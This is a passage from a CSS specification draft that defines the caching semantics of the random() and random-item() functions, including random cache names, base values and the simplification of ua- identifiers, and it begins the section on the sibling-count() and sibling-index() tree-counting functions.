<a id="ref-for-identifier-value⑦"></a>

The <a id="valdef-random-random-ua-ident"></a>[\<random-ua-ident\>](#typedef-random-ua-ident) value, like [fixed](#valdef-random-fixed) below, isn’t intended to be specified by authors, but can show up in [computed values](https://drafts.csswg.org/css-cascade-5/#computed-value). It is a [\<custom-ident\>](https://drafts.csswg.org/css-values-4/#identifier-value) that must start with the prefix ua-, or else it is invalid. When generated automatically by the user agent, it follows certain specific patterns; see [§ 9.4.1 Simplification of \<random-key\>](#random-simplify) for details.

<a id="ref-for-number-value①④"></a>

<a id="valdef-random-fixed"></a>fixed [\<number \[0,1\]\>](https://drafts.csswg.org/css-values-4/#number-value)

<a id="ref-for-number-value①⑤"></a>

<a id="ref-for-css-random-function①①"></a>

<a id="ref-for-random-cache-name⑨"></a>

<a id="ref-for-number-value①⑥"></a>

<a id="ref-for-random-base-value⑤"></a>

If fixed [\<number\>](https://drafts.csswg.org/css-values-4/#number-value) is specified, the [random function](#css-random-function) bypasses the [random cache name](#random-cache-name) entirely, and just uses the [\<number\>](https://drafts.csswg.org/css-values-4/#number-value) as its [random base value](#random-base-value) directly.

<a id="ref-for-random-base-value⑥"></a>

While 1 is technically allowed as a valid value (because CSS grammars can only express closed ranges), the [random base value](#random-base-value) is clamped to the highest representable value less than 1, so <a id="ref-for-random-base-value⑦"></a>random base values remain in the half-open range \`\[0, 1)\`.

<a id="ref-for-css-inheritance"></a>

<a id="ref-for-random-base-value⑧"></a>

<a id="ref-for-computed-value①⑦"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: While this value <em>might</em> be useful for authors to get predictable values while testing a page, the reason it exists is to fix some corner cases in [inheritance](https://drafts.csswg.org/css-cascade-5/#css-inheritance) that would otherwise cause elements to <em>not</em> share [random base values](#random-base-value) when authors would expect them to. It is observable in some rare [computed values](https://drafts.csswg.org/css-cascade-5/#computed-value), but otherwise will never show up in an element’s styles.

<a id="ref-for-random-cache-name①⓪"></a>

<a id="ref-for-css-random-function①②"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-cd1f495d"></a> Note that only the [random cache name](#random-cache-name) controls whether two [random functions](#css-random-function) have the same value or not; their <em>other</em> arguments don’t contribute in any way.
>
> Thus, the following two styles:
>
> ```text
> .foo {
>   width: random(--foo, 100px, 200px);
>   animation: --pulse linear random(--foo, 1s, 2s);
> }
> ```
>
> <a id="ref-for-random-base-value⑨"></a>
>
> <a id="ref-for-random-cache-name①①"></a>
>
> will actually share a [random base value](#random-base-value) because their [random cache names](#random-cache-name) are identical. If this <a id="ref-for-random-cache-name①②"></a>random cache name is linked to a <a id="ref-for-random-base-value①⓪"></a>random base value of 0.25, for example, this will give the element a width of 125px and an animation-duration of 1.25s.
>
> <a id="ref-for-random-cache-name①③"></a>
>
> <a id="ref-for-typedef-random-key①③"></a>
>
> If you want the values to be completely uncorrelated, give them distinct names (--foo vs --bar) or mix in additional information that will uniquify their [random cache names](#random-cache-name) (specifying --foo property-scoped, or omitting the [\<random-key\>](#typedef-random-key) argument entirely)

<a id="ref-for-valdef-random-auto③"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> <a id="auto-naming-details"></a>
>
> Details about how [auto](#valdef-random-auto) works
>
> <a id="ref-for-valdef-random-auto④"></a>
>
> <a id="ref-for-typedef-dashed-ident④"></a>
>
> The [auto](#valdef-random-auto) value is identical to specifying --foo element-scoped property-index-scoped, just with an unobservable name that you can’t manually match with a [\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident).
>
> <a id="ref-for-css-random-function①③"></a>
>
> <a id="ref-for-random-cache-name①④"></a>
>
> <a id="ref-for-random-base-value①①"></a>
>
> <em>Usually</em>, this ensures that every instance of a [random function](#css-random-function), on every element, gets a different [random cache name](#random-cache-name) and thus a different [random base value](#random-base-value). However, this can fail in some corner cases, causing random values to be shared when it’s unexpected. For example, in the following:
>
> ```text
> .foo {
>   animation: flicker linear random(1s, 2s);
> }
> .foo:hover {
>   animation: glow linear random(4s, 6s);
> }
> ```
>
> <a id="ref-for-funcdef-random⑦"></a>
>
> <a id="ref-for-random-cache-name①⑤"></a>
>
> <a id="ref-for-css-random-function①④"></a>
>
> <a id="ref-for-propdef-animation"></a>
>
> <a id="ref-for-random-base-value①②"></a>
>
> The two [random()](#funcdef-random) functions have the same [random cache name](#random-cache-name) on a given element (both are the first [random function](#css-random-function) used in [animation](https://drafts.csswg.org/css-animations-1/#propdef-animation)), so they’ll share [random base values](#random-base-value) on a single element and generate related random values, even though the author likely considers them to be different instances of <a id="ref-for-funcdef-random⑧"></a>random().
>
> <a id="ref-for-attr-style"></a>
>
> This unexpected sharing is, unfortunately, unavoidable. CSS generally doesn’t care <em>how</em> you organize styles for your elements; in particular, whether you style several elements with a single style rule like .foo, .bar {...}, multiple style rules like .foo {...} .bar {...}, or by setting the <code><a href="https://html.spec.whatwg.org/multipage/dom.html#attr-style">style</a></code> attribute on each element individually, you’ll get the same results. This needs to continue to be true even when you’re using random values, so we can’t distinguish random values by how they’re <em>set</em>, only how they’re <em>used</em>.
>
> <a id="ref-for-typedef-dashed-ident⑤"></a>
>
> There’s no syntactic distinction in a stylesheet between styling "related" elements and "independent" elements, or distinguishing "independent" states, so we must treat all elements as potentially related for this purpose. If this is undesirable, you can always supply a sufficiently unique [\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident) yourself, like random(--sidebar-width, ...) on one set of elements and random(--card-width, ...) on another, or random(--flicker, ...) and random(--glow, ...) on the different rules.

<a id="ref-for-funcdef-random⑨"></a>

<a id="ref-for-funcdef-random-item①①"></a>

More specifically, the [random()](#funcdef-random) and [random-item()](#funcdef-random-item) functions are defined to generate random values under the following caching semantics:

- <a id="ref-for-css-random-function①⑤"></a>

  Each instance of a [random function](#css-random-function) in styles has an associated <a id="random-base-value"></a>random base value.

  <a id="ref-for-css-random-function①⑥"></a>

  <a id="ref-for-typedef-random-key①④"></a>

  <a id="ref-for-number-value①⑦"></a>

  <a id="ref-for-random-base-value①③"></a>

  If the [random function’s](#css-random-function) [\<random-key\>](#typedef-random-key) is fixed [\<number\>](https://drafts.csswg.org/css-values-4/#number-value), the [random base value](#random-base-value) is that number.

  <a id="ref-for-random-base-value①④"></a>

  <a id="ref-for-random-cache-name①⑥"></a>

  Otherwise, the [random base value](#random-base-value) is a pseudo-random real number in the range \`\[0, 1)\` (greater than or equal to 0 and less than 1), generated from a uniform distribution, and influenced by the function’s [random cache name](#random-cache-name).

- <a id="ref-for-css-random-function①⑦"></a>

  <a id="ref-for-random-cache-name①⑦"></a>

  <a id="ref-for-random-base-value①⑤"></a>

  Each [random function](#css-random-function) also specifies a <a id="random-cache-name"></a>random cache name. Two <a id="ref-for-css-random-function①⑧"></a>random functions with the same [random cache name](#random-cache-name) must also have the same [random base value](#random-base-value); two functions with different <a id="ref-for-random-cache-name①⑧"></a>random cache names must have distinct <a id="ref-for-random-base-value①⑥"></a>random base values. (That is, generated by a fresh random operation; randomness might of course produce the same actual value.)

  <a id="ref-for-random-cache-name①⑨"></a>

  It is intentionally unspecified <em>how</em> the [random cache name](#random-cache-name) is used to achieve this. It can literally cache a generated random value, or be used as a seed for a PRNG, etc.

- <a id="ref-for-random-cache-name②⓪"></a>

  <a id="ref-for-tuple"></a>

  A [random cache name](#random-cache-name) is a [tuple](https://infra.spec.whatwg.org/#tuple) of:

  1.  <a id="ref-for-string②"></a>

      <a id="ref-for-typedef-dashed-ident⑥"></a>

      A nullable [string](https://infra.spec.whatwg.org/#string) name: the value of the [\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident), if specified; otherwise null.

  2.  <a id="ref-for-string③"></a>

      <a id="ref-for-typedef-random-ua-ident③"></a>

      A nullable [string](https://infra.spec.whatwg.org/#string) property/index value: the value of the [\<random-ua-ident\>](#typedef-random-ua-ident), if specified/calculated; otherwise null.

  3.  <a id="ref-for-element"></a>

      <a id="ref-for-pseudo-element①"></a>

      <a id="ref-for-custom-function①"></a>

      <a id="ref-for-valdef-random-element-scoped②"></a>

      A nullable /element identifier/ uniquely identifying the object the style is being applied to (the <code><a href="https://dom.spec.whatwg.org/#element">Element</a></code>, [pseudo-element](https://drafts.csswg.org/selectors-4/#pseudo-element), or [custom function](https://drafts.csswg.org/css-mixins-1/#custom-function) evaluation’s "hypothetical element"), if [element-scoped](#valdef-random-element-scoped) is specified; otherwise null.

  4.  <a id="ref-for-document"></a>

      A /document identifier/ identifying the <code><a href="https://dom.spec.whatwg.org/#document">Document</a></code> the styles are from.

  <a id="ref-for-element①"></a>

  <a id="ref-for-document①"></a>

  The /element identifier/ and /document identifier/ must have the same lifetimes and equivalence semantics as a JavaScript reference to the <code><a href="https://dom.spec.whatwg.org/#element">Element</a></code> or <code><a href="https://dom.spec.whatwg.org/#document">Document</a></code>.

  > <strong data-conversion-semantic="issue">Issue</strong>
  >
  > <a id="issue-0dcd6797"></a> The behavior for pseudo-elements needs to be clarified.

- <a id="ref-for-random-cache-name②①"></a>

  <a id="ref-for-random-base-value①⑦"></a>

  <a id="ref-for-computed-value①⑧"></a>

  <a id="ref-for-css-inheritance①"></a>

  The [random cache name](#random-cache-name) and [random base value](#random-base-value) must be determined by [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) time, before [inheritance](https://drafts.csswg.org/css-cascade-5/#css-inheritance), so that a random function that is unresolved by inheritance time (due to containing, for example, a layout-sensitive percentage) does not have a different behavior on children than one that resolves immediately.

<a id="ref-for-random-cache-name②②"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-2ac13183"></a> Shorthands are recorded as part of the [random cache name](#random-cache-name), rather than the longhand the value gets expanded to. For example:
>
> ```text
> .same-tb-same-rl {
>   margin: random(0px, 10px) random(0px, 10px);
> }
> ```
>
> <a id="ref-for-typedef-random-ua-ident④"></a>
>
> <a id="ref-for-random-cache-name②③"></a>
>
> <a id="ref-for-propdef-margin-top"></a>
>
> <a id="ref-for-propdef-margin-bottom"></a>
>
> <a id="ref-for-propdef-margin-left"></a>
>
> <a id="ref-for-propdef-margin-right"></a>
>
> Here, the [\<random-ua-ident\>](#typedef-random-ua-ident) part of the [random cache name](#random-cache-name) is "ua-margin-1" and "ua-margin-2", respectively. After expansion, then, [margin-top](https://drafts.csswg.org/css-box-4/#propdef-margin-top) and [margin-bottom](https://drafts.csswg.org/css-box-4/#propdef-margin-bottom) will share the same random value, and [margin-left](https://drafts.csswg.org/css-box-4/#propdef-margin-left) and [margin-right](https://drafts.csswg.org/css-box-4/#propdef-margin-right) will share a different random value.
>
> Combining shorthands with longhands will produce different caching keys:
>
> ```text
> .different-tb-same-rl {
>   margin: random(0px, 10px) random(0px, 10px);
>   margin-bottom: random(0px, 10px);
> }
> ```
>
> <a id="ref-for-propdef-margin-bottom①"></a>
>
> <a id="ref-for-random-cache-name②④"></a>
>
> <a id="ref-for-typedef-random-ua-ident⑤"></a>
>
> <a id="ref-for-propdef-margin-top①"></a>
>
> <a id="ref-for-propdef-margin-left①"></a>
>
> <a id="ref-for-propdef-margin-right①"></a>
>
> The [margin-bottom](https://drafts.csswg.org/css-box-4/#propdef-margin-bottom) value has a [random cache name](#random-cache-name) [\<random-ua-ident\>](#typedef-random-ua-ident) of `"ua-margin-bottom-1"`, which is different from the [margin-top](https://drafts.csswg.org/css-box-4/#propdef-margin-top) key of `"ua-margin-1"`, so the top and bottom margins will be different random values. [margin-left](https://drafts.csswg.org/css-box-4/#propdef-margin-left) and [margin-right](https://drafts.csswg.org/css-box-4/#propdef-margin-right) continue to share a third random value `"ua-margin-2"`, as they still share the name `"margin"` property name and `2` index.

<a id="ref-for-custom-property⑤"></a>

<a id="ref-for-css-random-function①⑨"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-4ea8a8c3"></a> The evaluation semantics of [custom properties](https://drafts.csswg.org/css-variables-2/#custom-property) can make [random functions](#css-random-function) act a little unpredictably if you’re not careful.
>
> For example, in the following:
>
> ```text
> .square-or-rect {
>   --size: random(100px, 500px);
>   width: var(--size);
>   height: var(--size);
> }
> ```
>
> <a id="ref-for-registered-custom-property⑤"></a>
>
> <a id="ref-for-x②"></a>
>
> <a id="ref-for-funcdef-random①⓪"></a>
>
> <a id="ref-for-typedef-random-key①⑤"></a>
>
> <a id="ref-for-propdef-width①"></a>
>
> <a id="ref-for-propdef-height"></a>
>
> <a id="ref-for-random-cache-name②⑤"></a>
>
> If --size isn’t a [registered custom property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property), or is registered but with the universal grammar [\*](https://drafts.csswg.org/selectors-3/#x), the [random()](#funcdef-random) function isn’t evaluated (or even recognized \*as\* a <a id="ref-for-funcdef-random①①"></a>random() function) in --size, so the default rules for an omitted [\<random-key\>](#typedef-random-key) aren’t applied. Instead, it’s evaluated when it’s substituted into [width](https://drafts.csswg.org/css-sizing-3/#propdef-width) and [height](https://drafts.csswg.org/css-sizing-3/#propdef-height), so each gets a distinct [random cache name](#random-cache-name), and this ends up defining a random <em>rectangle</em>, rather than a square.
>
> <a id="ref-for-valdef-random-element-scoped③"></a>
>
> <a id="ref-for-typedef-random-key①⑥"></a>
>
> Similarly, [element-scoped](#valdef-random-element-scoped) in the [\<random-key\>](#typedef-random-key) won’t cause the function to determine its "element identifier" until substitution actually happens—​which might be <em>after</em> --size has inherited through multiple elements—​so again multiple elements using var(--size) would end up with distinct random values rather than sharing one value defined on their ancestor.
>
> <a id="ref-for-typedef-dashed-ident⑦"></a>
>
> The first issue can be resolved, if desired, by specifying a [\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident) explicitly, rather than relying on the defaulting rules.
>
> <a id="ref-for-registered-custom-property⑥"></a>
>
> <a id="ref-for-funcdef-random①②"></a>
>
> <a id="ref-for-custom-property⑥"></a>
>
> <a id="ref-for-typedef-random-ua-ident⑥"></a>
>
> Both issues can be resolved by instead using a [registered custom property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property) with a non-universal grammar, so the [random()](#funcdef-random) function will be parsed and evaluated by the [custom property](https://drafts.csswg.org/css-variables-2/#custom-property) (gaining a [\<random-ua-ident\>](#typedef-random-ua-ident) of "ua---size-1"), and then the resolved random value will be substituted into each property.

<a id="ref-for-typedef-random-key①⑦"></a>

#### <a id="random-simplify"></a>9.4.1.  Simplification of [\<random-key\>](#typedef-random-key)

<a id="ref-for-typedef-random-key①⑧"></a>

<a id="ref-for-css-random-function②⓪"></a>

At parse time, certain transformations are performed on the [\<random-key\>](#typedef-random-key) of a [random function](#css-random-function):

- <a id="ref-for-typedef-random-key①⑨"></a>

  <a id="ref-for-valdef-random-auto⑤"></a>

  If the [\<random-key\>](#typedef-random-key) is [auto](#valdef-random-auto) (or omitted), it’s turned into element-scoped property-index-scoped. (And then subject to the below transformations.)

- <a id="ref-for-typedef-random-key②⓪"></a>

  <a id="ref-for-valdef-random-property-scoped①"></a>

  <a id="ref-for-valdef-random-property-index-scoped"></a>

  <a id="ref-for-typedef-random-ua-ident⑦"></a>

  <a id="ref-for-css-random-function②①"></a>

  If the [\<random-key\>](#typedef-random-key) contains [property-scoped](#valdef-random-property-scoped) or [property-index-scoped](#valdef-random-property-index-scoped), that keyword is replaced by a [\<random-ua-ident\>](#typedef-random-ua-ident): either ua-PROPERTY with PROPERTY being the property the value was parsed as, or ua-PROPERTY-INDEX with PROPERTY as the previous and INDEX being the 1-indexed integer index of this [random function](#css-random-function) among all <a id="ref-for-css-random-function②②"></a>random functions being used in the declaration.

  The INDEX value is based on the ordering in the parsed value, before any canonicalization/reordering might occur that could shuffle the values around.

<a id="ref-for-typedef-random-ua-ident⑧"></a>

In certain cases, the [\<random-ua-ident\>](#typedef-random-ua-ident) is slightly more complex:

- <a id="ref-for-custom-function②"></a>

  <a id="ref-for-descdef-function-result"></a>

  when evaluated inside of a [custom function](https://drafts.csswg.org/css-mixins-1/#custom-function) (in a property with a type that causes evaluation, such as a typed argument or a typed [result](https://drafts.csswg.org/css-mixins-1/#descdef-function-result)), in addition to the PROPERTY and/or INDEX, the function’s name is captured in the ident: ua-FUNCTIONNAME-PROPERTY or ua-FUNCTIONNAME-PROPERTY-INDEX.

  > <strong data-conversion-semantic="note">Note</strong>
  >
  > Note: This ensures that different functions that just happen to use the same internal variable names don’t accidentally tie their random values together.

  > <strong data-conversion-semantic="example">Example</strong>
  >
  > <a id="example-69ace575"></a>
  > For example, given the following custom function and usage:
  >
  > ```text
  > @function --ex(--arg <length>) returns <length> {
  >   --local: random(2px, 3px);
  >   result: calc(var(--arg) + var(--local) + random(3px, 4px));
  > }
  > .foo {
  >   width: --ex(random(1px, 2px));
  > }
  > ```
  >
  > <a id="ref-for-length-value①①"></a>
  >
  > <a id="ref-for-typedef-random-ua-ident⑨"></a>
  >
  > The --arg is registered as a [\<length\>](https://drafts.csswg.org/css-values-4/#length-value), so it’s value is evaluated within the --arg property, getting a [\<random-ua-ident\>](#typedef-random-ua-ident) of ua---ex---arg-1.
  >
  > <a id="ref-for-funcdef-random①③"></a>
  >
  > The --local is <em>not</em> registered, so it doesn’t evaluate the [random()](#funcdef-random) at all; it’s left as-is until substitution.
  >
  > <a id="ref-for-descdef-function-result①"></a>
  >
  > <a id="ref-for-length-value①②"></a>
  >
  > <a id="ref-for-typedef-random-ua-ident①⓪"></a>
  >
  > The [result](https://drafts.csswg.org/css-mixins-1/#descdef-function-result) is also registered as a [\<length\>](https://drafts.csswg.org/css-values-4/#length-value). Both the random(2px, 3px) (from --local substitution) and random(3px, 4px) (written literally) evaluate within <a id="ref-for-descdef-function-result②"></a>result, getting [\<random-ua-ident\>](#typedef-random-ua-ident)s of ua---ex-result-1 and ua---ex-result-2.

  > <strong data-conversion-semantic="example">Example</strong>
  >
  > <a id="example-f2b6d6c8"></a> On the other hand, in this example:
  > ```text
  > @function --no-types(--arg) {
  >   result: calc(var(--arg) + random(2px, 3px));
  > }
  > .foo {
  >   width: --no-types(random(1px, 2px));
  > }
  > ```
  >
  > <a id="ref-for-descdef-function-result③"></a>
  >
  > <a id="ref-for-propdef-width②"></a>
  >
  > <a id="ref-for-typedef-random-ua-ident①①"></a>
  >
  > Neither the --arg argument nor the [result](https://drafts.csswg.org/css-mixins-1/#descdef-function-result) are typed, so their values aren’t evaluated within the function. The function call substitutes itself with the value calc(random(1px, 2px) + random(2px, 3px)), which is then evaluated within [width](https://drafts.csswg.org/css-sizing-3/#propdef-width), getting [\<random-ua-ident\>](#typedef-random-ua-ident)s of ua-width-1 and ua-width-2 instead.

- <a id="ref-for-arbitrary-substitution-function⑧"></a>

  when evaluated inside of an [arbitrary substitution function](#arbitrary-substitution-function) as part of the substitution process, the prefix is ua-early- rather than just ua-: ua-early-PROPERTY or ua-early-PROPERTY-INDEX.

  <a id="ref-for-arbitrary-substitution-function⑨"></a>

  Additionally, if the INDEX portion is included in the ident, it is incremented <em>separately</em> from non-"early" usage (that is, the "early" usage counts up from 1, then non-"early" usage will also count up from 1) and increments across substitutions in the property (that is, multiple different [arbitrary substitution functions](#arbitrary-substitution-function) will use successive indexes, rather than resetting to 1 for each substitution).

  > <strong data-conversion-semantic="example">Example</strong>
  >
  > <a id="example-964bd253"></a> For example, in this relatively complex value:
  > ```text
  > .foo {
  >   width: calc(
  >     if(
  >       style(/*eA*/random(auto, ...) < 0.5):
  >         /*lA*/random(auto, ...);
  >       else:
  >         /*lB*/random(auto, ...))
  >     )
  >     +
  >     if(
  >       style(/*eB*/random(auto, ...) < 0.5):
  >         /*lC*/random(auto, ...);
  >       else:
  >         /*lD*/random(auto, ...))
  >     )
  >   );
  > }
  > ```
  >
  > <a id="ref-for-replace-an-arbitrary-substitution-function⑤"></a>
  >
  > <a id="ref-for-funcdef-if⑨"></a>
  >
  > During [replacement](#replace-an-arbitrary-substitution-function), the tests of both [if()](#funcdef-if)s are parsed (since using == or \> provides a numeric context, giving the UA the necessary knowledge to evaluate them), resulting in, effectively, the following code:
  >
  > ```text
  > .foo {
  >   width: calc(
  >     if(
  >       style(/*eA*/random(element-scoped ua-early-width-1, ...) < 0.5):
  >         /*lA*/random(auto, ...);
  >       else:
  >         /*lB*/random(auto, ...))
  >     )
  >     +
  >     if(
  >       style(/*eB*/random(element-scoped ua-early-width-2, ...) < 0.5):
  >         /*lC*/random(auto, ...);
  >       else:
  >         /*lD*/random(auto, ...))
  >     )
  >   );
  > }
  > ```
  >
  > <a id="ref-for-typedef-random-ua-ident①②"></a>
  >
  > That is, the two values in the tests have distinct [\<random-ua-ident\>](#typedef-random-ua-ident)s, and will be element-scoped as well, so every instance on every element will evaluate to distinct values.
  >
  > <a id="ref-for-funcdef-if①⓪"></a>
  >
  > <a id="ref-for-propdef-width③"></a>
  >
  > <a id="ref-for-typedef-random-ua-ident①③"></a>
  >
  > Based on these random values, each [if()](#funcdef-if) will substitute itself with one of its two (unevaluated) branches. When these are then parsed according to the [width](https://drafts.csswg.org/css-sizing-3/#propdef-width) grammar, they will receive "normal" [\<random-ua-ident\>](#typedef-random-ua-ident)s with their indexes restarting from 1, effectively:
  >
  > ```text
  > .foo {
  >   width: calc(
  >     /*lA*/random(element-scoped ua-width-1, ...)
  >     +
  >     /*lD*/random(element-scoped ua-width-2, ...)
  >     )
  >   );
  > }
  > ```
  >
  > <a id="ref-for-typedef-random-ua-ident①④"></a>
  >
  > Since these are using different [\<random-ua-ident\>](#typedef-random-ua-ident)s than the "early" ones, their random values will be distinct as well.

<a id="ref-for-funcdef-if①①"></a>

<a id="ref-for-descdef-function-result④"></a>

<a id="ref-for-typedef-random-ua-ident①⑤"></a>

These additional modifiers can be combined. For example, if a random(0, 1) is evaluated in the test of an [if()](#funcdef-if) used in the [result](https://drafts.csswg.org/css-mixins-1/#descdef-function-result) of a custom function named --foo(), the [\<random-ua-ident\>](#typedef-random-ua-ident) will be ua-early---foo-result-1.

<a id="ref-for-typedef-random-key②①"></a>

<a id="ref-for-typedef-random-ua-ident①⑥"></a>

<a id="ref-for-serialize-a-css-value"></a>

If the [\<random-key\>](#typedef-random-key) contains a [\<random-ua-ident\>](#typedef-random-ua-ident), this must not be omitted in the serialization of the value, even if this would normally be valid per the ["shortest serialization principle"](https://drafts.csswg.org/cssom-1/#serialize-a-css-value).

<a id="ref-for-propdef-margin"></a>

<a id="ref-for-typedef-random-key②②"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-c66e2c64"></a> For example, specifying [margin: random(10px, 20px) random(10px, 20px)](https://drafts.csswg.org/css-box-4/#propdef-margin) will cause the top and bottom margins to be one random value, and the left and right margins to be another random value. The omitted [\<random-key\>](#typedef-random-key)s get rewritten at parse-time to element-scoped ua-margin-1 and element-scoped ua-margin-2, respectively, before they expand into the <a id="ref-for-propdef-margin①"></a>margin longhands.
>
> <a id="ref-for-propdef-margin-top②"></a>
>
> <a id="ref-for-propdef-margin-bottom②"></a>
>
> This way, the [margin-top](https://drafts.csswg.org/css-box-4/#propdef-margin-top) and [margin-bottom](https://drafts.csswg.org/css-box-4/#propdef-margin-bottom) longhands will both contain the key element-scoped ua-margin-1, ensuring that the two values remain linked even if you read and then set the value back.

<a id="ref-for-random-base-value①⑧"></a>

<a id="ref-for-css-random-function②③"></a>

<a id="ref-for-specified-value①"></a>

<a id="ref-for-math-function⑦"></a>

<a id="ref-for-funcdef-random①④"></a>

<a id="ref-for-simplify-a-calculation-tree"></a>

<a id="ref-for-calc-calculation⑤"></a>

<a id="ref-for-computed-value①⑨"></a>

<a id="ref-for-typedef-random-key②③"></a>

The [random base value](#random-base-value) of a [random function](#css-random-function) is generally known at [specified value](https://drafts.csswg.org/css-cascade-5/#specified-value) time, once it’s known which element the function is being applied to. As a [math function](https://drafts.csswg.org/css-values-4/#math-function), a [random()](#funcdef-random) function can be [simplified](https://drafts.csswg.org/css-values-4/#simplify-a-calculation-tree) as soon as its argument [calculations](https://drafts.csswg.org/css-values-4/#calc-calculation) can be simplified to compatible numeric values. If a <a id="ref-for-funcdef-random①⑤"></a>random() function can’t be fully <a id="ref-for-simplify-a-calculation-tree①"></a>simplified by [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) time, then its arguments are maximally simplified, and its specified [\<random-key\>](#typedef-random-key) is replaced with fixed BASE, where BASE is the function’s <a id="ref-for-random-base-value①⑨"></a>random base value.

<a id="ref-for-arbitrary-substitution-function①⓪"></a>

<a id="ref-for-funcdef-random-item①②"></a>

<a id="ref-for-computed-value②⓪"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: As an [arbitrary substitution function](#arbitrary-substitution-function), [random-item()](#funcdef-random-item) is always replaced at [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) time.

<a id="ref-for-propdef-width④"></a>

<a id="ref-for-computed-value②①"></a>

<a id="ref-for-used-value⑨"></a>

<a id="ref-for-containing-block"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-478d1ba1"></a> For example, given the declaration [width: random(100px, 100%)](https://drafts.csswg.org/css-sizing-3/#propdef-width), the calculations can’t be simplified at [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) time because the percentage depend on [used value](https://drafts.csswg.org/css-cascade-5/#used-value) information (the size of the element’s [containing block](https://drafts.csswg.org/css-display-4/#containing-block), to resolve the 100% against).
>
> <a id="ref-for-computed-value②②"></a>
>
> <a id="ref-for-propdef-width⑤"></a>
>
> So, the [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) of the property becomes something like [width: random(fixed .1234, 100px, 100%)](https://drafts.csswg.org/css-sizing-3/#propdef-width). Once the 100% is resolved to a length (say, 500px), the function will be able to fully simplify (to 149.36px).

<a id="ref-for-funcdef-sibling-count"></a>

<a id="ref-for-funcdef-sibling-index①"></a>

## <a id="tree-counting"></a>10.  Tree Counting Functions: the [sibling-count()](#funcdef-sibling-count) and [sibling-index()](#funcdef-sibling-index) notations

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/tree-counting/calc-sibling-function-in-shadow-dom.html`
- `css/css-values/tree-counting/calc-sibling-function-parsing.html`
- `css/css-values/tree-counting/calc-sibling-function.html`
- `css/css-values/tree-counting/sibling-function-container-query-invalidation.html`
- `css/css-values/tree-counting/sibling-function-container-query.html`
- `css/css-values/tree-counting/sibling-function-invalidation.html`
- `css/css-values/tree-counting/sibling-index-keyframe-font-style-dynamic.html`
- `css/css-values/tree-counting/sibling-index-keyframe-font-variation-settings-dynamic.html`
- `css/css-values/tree-counting/sibling-index-keyframe-font-weight-dynamic.html`
- `css/css-values/tree-counting/sibling-index-keyframe-length-value-dynamic.html`
- `css/css-values/tree-counting/sibling-index-keyframe-palette-mix-dynamic.html`
- `css/css-values/tree-counting/sibling-index-keyframe-percent-dynamic.html`
- `css/css-values/tree-counting/sibling-index-keyframe-registered-properties-dynamic.html`
- `css/css-values/tree-counting/sibling-index-keyframe-rotate-dynamic.html`
- `css/css-values/tree-counting/sibling-index-keyframe-scale-dynamic.html`
- `css/css-values/tree-counting/sibling-index-keyframe-transform-dynamic.html`
- `css/css-values/tree-counting/sibling-index-keyframe-value-dynamic.html`
- `css/css-values/tree-counting/sibling-index-linear-gradient-gcs.html`
- `css/css-values/tree-counting/tree-scoped-sibling-function.html`
- `css/css-values/tree-counting/trig-functions-with-runtime-angle-arguments.html`

<a id="ref-for-functional-notation⑦"></a>

<a id="ref-for-integer-value①"></a>

<a id="ref-for-elements"></a>

The <a id="funcdef-sibling-count"></a>sibling-count() [functional notation](https://drafts.csswg.org/css-values-4/#functional-notation) represents, as an [\<integer\>](https://drafts.csswg.org/css-values-4/#integer-value), the total number of child [elements](https://drafts.csswg.org/css-display-3/#elements) in the parent of the element on which the notation is used.

<a id="ref-for-functional-notation⑧"></a>

<a id="ref-for-integer-value②"></a>

<a id="ref-for-concept-tree-inclusive-sibling"></a>

<a id="ref-for-nth-child-pseudo"></a>

<a id="ref-for-funcdef-sibling-index②"></a>

The <a id="funcdef-sibling-index"></a>sibling-index() [functional notation](https://drafts.csswg.org/css-values-4/#functional-notation) represents, as an [\<integer\>](https://drafts.csswg.org/css-values-4/#integer-value), the index of the element on which the notation is used among its [inclusive siblings](https://dom.spec.whatwg.org/#concept-tree-inclusive-sibling). Like [:nth-child()](https://drafts.csswg.org/selectors-4/#nth-child-pseudo), [sibling-index()](#funcdef-sibling-index) is 1-indexed.

Together, these are known as the <a id="tree-counting-functions"></a>tree-counting functions.

<a id="ref-for-funcdef-counter"></a>

<a id="ref-for-funcdef-sibling-index③"></a>

<a id="ref-for-string-value①⓪"></a>

<a id="ref-for-integer-value③"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [counter()](https://drafts.csswg.org/css-lists-3/#funcdef-counter) function can provide similar abilities as [sibling-index()](#funcdef-sibling-index), but returns a [\<string\>](https://drafts.csswg.org/css-values-4/#string-value) rather than an [\<integer\>](https://drafts.csswg.org/css-values-4/#integer-value).

<a id="ref-for-element-backed"></a>

<a id="ref-for-tree-counting-functions"></a>

<a id="ref-for-pseudo-element②"></a>

<a id="ref-for-ultimate-originating-element"></a>

When used on an [element-backed pseudo-element](https://drafts.csswg.org/css-pseudo-4/#element-backed) that is also a real element, the [tree-counting functions](#tree-counting-functions) resolve for that real element. For other [pseudo-elements](https://drafts.csswg.org/selectors-4/#pseudo-element), they resolve as if they were resolved against the [ultimate originating element](https://drafts.csswg.org/selectors-4/#ultimate-originating-element).

<a id="ref-for-tree-counting-functions①"></a>

<a id="ref-for-tree-scoped-name-loosely-matched"></a>

<a id="ref-for-css-tree-scoped-reference"></a>

<a id="ref-for-css-tree-scoped-name"></a>

